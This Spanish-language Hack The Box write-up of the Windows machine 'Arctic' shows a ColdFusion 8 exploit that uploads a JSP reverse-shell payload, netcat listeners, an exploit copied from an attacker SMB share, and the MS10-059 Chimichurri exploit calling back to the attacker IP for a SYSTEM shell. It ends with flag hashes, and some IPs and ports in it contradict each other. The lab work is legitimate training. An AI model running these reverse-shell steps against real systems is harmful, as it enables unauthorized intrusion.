---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/9
dificultad: Fácil
ip: 10.10.10.11
os: Windows
relacionados:
  - "[[Adobe ColdFusion 8 Exploitation]]"
  - "[[Directory Traversal Vulnerability]]"
  - "[[Cracking Hashes]]"
  - "[[Abusing Scheduled Tasks]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Windows-Exploit-Suggester]]"
  - "[[Chimichurri.exe]]"
  - "[[MS10-059]]"
---
# HackTheBox - Arctic

## Reconocimiento

Mi primer paso fue realizar un escaneo exhaustivo de la máquina para identificar los puertos abiertos y los servicios que se ejecutan en ellos. Para ser eficiente, primero ejecuté un escaneo rápido de todos los puertos y luego uno más detallado sobre los que encontré abiertos.

### Escaneo de Puertos

Lancé `nmap` con los siguientes comandos para enumerar los servicios:
```Bash
# Escaneo rápido para encontrar puertos abiertos
masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > allports

# Extraer y formatear la lista de puertos para nmap
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn --defeat-rst-ratelimit $(cat ip) -oG 01_Reconnaissance/tcpports

# Escaneo detallado con nmap sobre los puertos descubiertos
nmap -sCV -p135,8500,49154 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados del escaneo fueron los siguientes:
```Bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 04:54 CDT
Nmap scan report for 10.10.10.11
Host is up (0.0088s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!info] Punto de Interés
> 
> El puerto 8500 llama la atención. Aunque nmap no pudo identificar el servicio (fmtp?), decidí investigarlo a través de un navegador web. Noté que el servidor tardaba entre 20 y 30 segundos en responder, lo que podría ser un factor importante más adelante.

Al navegar a `http://10.10.10.11:8500`, me encontré con un listado de directorios. Explorando un poco, descubrí la ruta `/CFIDE/administrator/`, que me llevó a un panel de inicio de sesión de **Adobe ColdFusion 8**.


---

## Explotación de vulnerabilidades

### Obteniendo Acceso como 'tolis'

Modifiqué el script PoC de Python para apuntar a la máquina víctima y configurar mi dirección IP y puerto de escucha para la reverse shell.
```Python
#...SNIP...
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.17' # <--- Mi IP
    lport = 443
    rhost = "10.10.10.11" # <--- IP de la víctima
    rport = 8500
    filename = uuid.uuid4().hex
#...SNIP...
```

El script funciona generando un payload en formato `.jsp` con `msfvenom`, lo sube al servidor a través de la vulnerabilidad y luego lo ejecuta para establecer la conexión inversa.

Preparé un listener en mi máquina con `netcat` para recibir la conexión:
```Bash
nc -lvnp 443
```

Luego, ejecuté el script de explotación:
```Bash
python3 poc.py
```

El script se ejecutó correctamente y recibí una shell en mi listener.
```Bash
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49249
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

> [!SUCCESS] Acceso Inicial Conseguido
> 
> He obtenido una shell en el sistema como el usuario tolis. La bandera de usuario se encontraba en C:\users\tolis\desktop\user.txt.


---

## Escalada de privilegios

### Enumeración del Sistema

Una vez dentro, mi primer paso fue recopilar información sobre el sistema operativo para identificar posibles vectores de escalada. Ejecuté el comando `systeminfo`:
```Bash
C:\>systeminfo
```

```
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
...
System Type:               x64-based PC
...
Hotfix(s):                 N/A
...
```

> [!info] Hallazgo Clave
> 
> La salida de systeminfo fue reveladora. El sistema es un Windows Server 2008 R2 y, lo más importante, no tiene ningún hotfix (parche de seguridad) aplicado. Esto lo convierte en un objetivo ideal para exploits de kernel conocidos.

### Búsqueda de Exploits con Windows-Exploit-Suggester

Dado que el sistema no estaba parcheado, decidí usar la herramienta [Windows-Exploit-Suggester](https://github.com/Pwnistry/Windows-Exploit-Suggester-python3/blob/master/windows-exploit-suggester.py). Este script compara la información del sistema con una base de datos de vulnerabilidades conocidas de Microsoft.

Guardé la salida de `systeminfo` en un archivo y ejecuté el script en mi máquina de ataque, después de actualizar su base de datos:
```Bash
# Actualizar la base de datos de exploits
/opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update

# Ejecutar el script contra la info del sistema
/opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo.txt
```

La herramienta arrojó una larga lista de posibles exploits. Descartando los que requerían interacción del usuario (como los de Internet Explorer) o los que eran exclusivamente para Metasploit, me centré en los siguientes candidatos:
- `MS10-047`
- `MS10-059`
- `MS10-061`
- `MS10-073`
- `MS11-011`
- `MS13-005`
    
### Explotando MS10-059 (Chimichurri)

Tras investigar un poco, el exploit **MS10-059** me pareció el más prometedor. Encontré un exploit precompilado en GitHub llamado [Chimichurri.exe](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe), ideal para mi propósito, ya que permite especificar una IP y un puerto para obtener una reverse shell.

Para transferir el archivo, levanté un servidor SMB en mi máquina con `impacket`:
```Bash
impacket-smbserver share . -smb2support
```

Desde la shell en la máquina víctima, me conecté al recurso compartido y copié el exploit:
```PowerShell
C:\ProgramData> net use \\10.10.14.17\share
The command completed successfully.

C:\ProgramData> copy \\10.10.14.17\share\Chimichurri.exe .
        1 file(s) copied.
```

A continuación, puse un listener de `netcat` a la escucha en mi máquina en el puerto 443.
```Bash
rlwrap nc -nlvp 443
```

Finalmente, ejecuté el exploit en la máquina víctima, pasándole mi IP y el puerto de escucha:
```Bash
C:\ProgramData> .\Chimichurri.exe 10.10.14.17 443
/Chimichurri/-->This exploit gives you a Local System shell <BR>
/Chimichurri/-->Changing registry values...<BR>
/Chimichurri/-->Got SYSTEM token...<BR>
/Chimichurri/-->Running reverse shell...<BR>
/Chimichurri/-->Restoring default registry values...<BR>
```

Inmediatamente recibí la conexión en mi listener con privilegios elevados:
```Bash
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11:50381.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ProgramData>whoami
nt authority\system
```

> [!SUCCESS] Escalada de Privilegios Completada
> 
> He escalado mis privilegios a NT AUTHORITY\SYSTEM. La bandera de administrador se encontraba en C:\Users\Administrator\Desktop\root.txt.


---

## Bandera(s)

> [!flag] `flag{user}`
> 4185e4694c7a4502b98a74d6192f955c
^bandera-user

> [!flag] `flag{root}`
> a2988bdc9e01f9fcaf3ee4ed69ef0df7
^bandera-root

